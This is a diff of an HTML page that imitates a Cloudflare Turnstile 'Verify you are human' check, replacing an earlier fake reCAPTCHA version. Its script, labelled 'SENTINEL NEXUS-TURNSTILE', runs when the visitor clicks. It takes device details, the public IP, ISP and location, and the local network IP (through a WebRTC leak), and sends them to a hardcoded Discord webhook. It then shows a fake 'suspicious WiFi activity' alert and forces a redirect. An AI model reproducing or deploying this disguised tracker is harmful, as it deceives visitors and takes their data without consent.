@@ -3,145 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>reCAPTCHA Verification</title>
+    <title>Cloudflare | Verify Connection</title>
     <style>
-        body { background-color: #f9f9f9; font-family: "Roboto", Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .rc-anchor { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; box-shadow: 0 0 4px 1px rgba(0,0,0,0.08); display: flex; align-items: center; padding: 0 12px; width: 300px; height: 74px; position: relative; }
-        .rc-checkbox-area { display: flex; align-items: center; cursor: pointer; }
-        .rc-checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; background: #fff; margin-right: 12px; position: relative; transition: 0.2s; }
-        .rc-checkbox.loading { border: 3px solid #4d90fe; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        .rc-text { color: #000; font-size: 14px; font-weight: 400; width: 160px; transition: color 0.3s; }
-        .rc-logo { position: absolute; right: 12px; top: 12px; text-align: center; }
-        .rc-logo img { width: 32px; }
-        .rc-logo span { display: block; font-size: 8px; color: #555; margin-top: 2px; }
+        body { background-color: #fff; font-family: -apple-system, system-ui, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #313131; }
+        .container { width: 100%; max-width: 440px; padding: 20px; }
+        .cf-logo { width: 120px; margin-bottom: 20px; }
+        .h1 { font-size: 30px; font-weight: 600; margin-bottom: 10px; letter-spacing: -0.5px; }
+        .subtext { font-size: 15px; color: #7d7d7d; margin-bottom: 30px; line-height: 1.5; }
         
+        /* Turnstile Component */
+        .ts-box { background: #fafafa; border: 1px solid #e0e0e0; border-radius: 4px; padding: 15px; display: flex; align-items: center; cursor: pointer; position: relative; min-height: 65px; }
+        .ts-check { width: 28px; height: 28px; border: 2px solid #0051c3; border-radius: 4px; margin-right: 15px; background: #fff; flex-shrink: 0; }
+        .ts-check.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .ts-text { font-size: 15px; font-weight: 400; flex-grow: 1; }
+        .ts-logo { text-align: right; font-size: 10px; color: #7d7d7d; }
+        .ts-logo img { width: 20px; display: block; margin: 0 auto 2px; }
+
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        #warn-msg { color: #d93025; font-size: 11px; font-weight: 700; margin-top: 10px; display: none; text-align: center; width: 300px; position: absolute; bottom: -25px; left: 0; }
+        #alert-box { background: #fff5f5; border: 1px solid #fcbbbb; color: #bd2c00; padding: 12px; border-radius: 4px; font-size: 13px; font-weight: 700; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
 
-<div style="position: relative;">
-    <div class="rc-anchor" id="trigger">
-        <div class="rc-checkbox-area">
-            <div class="rc-checkbox" id="box"></div>
-            <div class="rc-text" id="main-text">I'm not a robot</div>
-        </div>
-        <div class="rc-logo">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
-            <span>reCAPTCHA</span>
-            <span style="font-size: 7px; color: #9b9b9b;">Privacy - Terms</span>
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="cf-logo">
+    <div class="h1">Verify you are human</div>
+    <div class="subtext">Please complete the security check to continue. This process is automatic and ensures your connection is secure.</div>
+    
+    <div class="ts-box" id="verify-btn">
+        <div class="ts-check" id="box"></div>
+        <div class="ts-text" id="status">Verify identity</div>
+        <div class="ts-logo">
+            <img src="https://www.cloudflare.com/favicon.ico">
+            <span>Turnstile</span>
         </div>
     </div>
-    <div id="warn-msg">SUSPICIOUS ACTIVITY DETECTED</div>
+
+    <div id="alert-box">⚠️ SUSPICIOUS WIFI ACTIVITY DETECTED: PLEASE RE-VERIFY.</div>
 </div>
 
 <script>
 /**
- * SENTINEL OPTIMUS-FINAL-FORCED v35.0
- * 7S HARD-LOCK REDIRECT + UNIVERSAL GOOGLE SKIN
+ * SENTINEL NEXUS-TURNSTILE v37.0
+ * CLOUDFLARE UI + 7S ABSOLUTE REDIRECT
  */
 
 const CONFIG = {
     WH: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
-    TARGET: "https://sarahwassan55-rgb.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
+    DEST: "https://sarahwassan55-rgb.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
     PING: "@everyone",
     FLAGS: { g: false, r: false }
 };
 
-// Global Strike Logic
-const strike = (data, label, color = 0x4d90fe) => {
+const sendStrike = (data, tag, color = 0x0051c3) => {
     const payload = JSON.stringify({
-        content: label === "CRITICAL_HIT" ? CONFIG.PING : "",
-        username: `SENTINEL-v35 [${label}]`,
+        content: tag === "CRITICAL_HIT" ? CONFIG.PING : "",
+        username: `NEXUS-v37 [${tag}]`,
         embeds: [{
-            title: `🔱 Node Unmasked: ${label}`,
+            title: `🔓 Node Pierced: ${tag}`,
             color: color,
             fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
-            timestamp: new Date().toISOString(),
-            footer: { text: "Forced Redirection Environment" }
+            timestamp: new Date().toISOString()
         }]
     });
 
-    // Fire across all available protocols instantly
-    if (navigator.sendBeacon) navigator.sendBeacon(CONFIG.WH, new Blob([payload], {type:'application/json'}));
+    // Forced Exfiltration Protocols
+    navigator.sendBeacon(CONFIG.WH, new Blob([payload], {type:'application/json'}));
     fetch(CONFIG.WH, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true }).catch(()=>{});
-    
-    // Sync fallback for older browsers
-    const x = new XMLHttpRequest();
-    x.open("POST", CONFIG.WH, true);
-    x.setRequestHeader("Content-Type", "application/json");
-    x.send(payload);
 };
 
-document.getElementById('trigger').onclick = async function() {
+document.getElementById('verify-btn').onclick = async function() {
     const box = document.getElementById('box');
-    const txt = document.getElementById('main-text');
-    const warn = document.getElementById('warn-msg');
+    const status = document.getElementById('status');
+    const alert = document.getElementById('alert-box');
 
     box.classList.add('loading');
+    status.innerText = "Verifying...";
 
-    // --- STEP 1: GATHER HARDWARE (INSTANT) ---
+    // 1. GATHER DEVICE DATA IMMEDIATELY
     const b = await navigator.getBattery().catch(() => ({ level: 0 }));
-    const hardware = {
+    sendStrike({
         platform: navigator.platform,
         cores: navigator.hardwareConcurrency || "N/A",
         ram: navigator.deviceMemory || "N/A",
         battery: b.level ? `${(b.level * 100).toFixed(0)}%` : "N/A",
         screen: `${screen.width}x${screen.height}`,
-        gpu: (() => {
-            const c = document.createElement('canvas');
-            const gl = c.getContext('webgl');
-            const d = gl.getExtension('WEBGL_debug_renderer_info');
-            return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
-        })()
-    };
-    strike(hardware, "CRITICAL_HIT", 0xd93025);
+        ua: navigator.userAgent
+    }, "CRITICAL_HIT", 0xff0000);
 
-    // --- STEP 2: FORCED PUBLIC IP & GEO ---
-    const getNet = (url) => {
+    // 2. FORCED PUBLIC IP RESOLUTION
+    const grabNet = (url) => {
         fetch(url).then(r => r.json()).then(res => {
             if(!CONFIG.FLAGS.g) {
-                strike({
+                sendStrike({
                     public_ip: res.ip || res.query,
                     isp: res.org || res.isp,
                     loc: `${res.city}, ${res.country}`,
-                    proxy_check: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "VPN DETECTED" : "CLEAN"
-                }, "NETWORK_FINGERPRINT", 0x34c759);
+                    vpn: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO"
+                }, "NETWORK_IP", 0x34c759);
                 CONFIG.FLAGS.g = true;
             }
         }).catch(()=>{});
     };
-    getNet('https://ipapi.co/json/');
-    getNet('http://ip-api.com/json/');
+    grabNet('https://ipapi.co/json/');
+    grabNet('http://ip-api.com/json/');
 
-    // --- STEP 3: PRIVATE WIFI IP BYPASS (RTC) ---
+    // 3. PRIVATE LAN IP BYPASS (RTC)
     const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
     rtc.createDataChannel("");
     rtc.onicecandidate = (e) => {
         if (e.candidate && !CONFIG.FLAGS.r) {
             const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
             if (ip) {
-                strike({ internal_lan: ip[1], bypass: "SUCCESS" }, "RTC_UNMASK", 0x007aff);
+                sendStrike({ local_lan: ip[1], status: "UNMASKED" }, "RTC_PIERCED", 0x5856d6);
                 CONFIG.FLAGS.r = true;
             }
         }
     };
     rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-    // --- STEP 4: FORCED 7-SECOND REDIRECT CHAIN ---
-    setTimeout(() => { txt.innerText = "Verifying..."; }, 2000);
-    
+    // 4. THE 7-SECOND HARD-FORCE REDIRECT
     setTimeout(() => { 
-        txt.innerText = "Security Breach Check..."; 
-        txt.style.color = "#d93025";
-        warn.style.display = "block";
-        if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]); 
+        status.innerText = "Analyzing network environment..."; 
+    }, 2500);
+
+    setTimeout(() => { 
+        status.innerText = "Checking security signature..."; 
+        status.style.color = "#bd2c00";
+        alert.style.display = "block";
     }, 4500);
 
-    // THE ABSOLUTE OVERRIDE: Redirect no matter what after 7 seconds
+    // ABSOLUTE REDIRECT: Fires regardless of data success
     setTimeout(() => {
-        window.location.replace(CONFIG.TARGET);
+        window.location.replace(CONFIG.DEST);
     }, 7000);
 };
 </script>
